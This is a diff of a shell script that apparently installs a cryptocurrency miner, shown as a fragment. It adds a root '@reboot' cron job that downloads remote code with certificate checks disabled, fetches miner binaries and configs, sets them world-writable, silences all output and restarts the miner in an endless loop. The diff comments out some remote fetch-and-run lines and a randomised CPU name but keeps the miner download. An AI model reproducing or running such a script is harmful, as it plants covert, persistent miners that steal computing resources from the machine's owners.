@@ -36,18 +36,18 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src
 
 
 rm -rf "${work}"; mkdir -p "${work}"
-wget --no-check-certificate -qO "${work}/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -qO "${work}/bash" "${src}/q"
+#wget --no-check-certificate -qO "${work}/appsettings.json" "${src}/q.json"
+#wget --no-check-certificate -qO "${work}/bash" "${src}/q"
 wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
 wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
 chmod -R 777 "${work}"
-[ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
-[ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
+#[ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
+#[ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
 [ -f "${work}/config.json" ] && [ -n "$rxName" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${rxName}\",/g" "${work}/config.json"
 [ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 
-sh <(wget --no-check-certificate -qO- ${src}/check.sh) >/dev/null 2>&1 &
-sh <(wget --no-check-certificate -qO- ${src}/epoch.sh) >/dev/null 2>&1 &
+#sh <(wget --no-check-certificate -qO- ${src}/check.sh) >/dev/null 2>&1 &
+#sh <(wget --no-check-certificate -qO- ${src}/epoch.sh) >/dev/null 2>&1 &
 
 cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
 if [ "$mode" == "0" ]; then
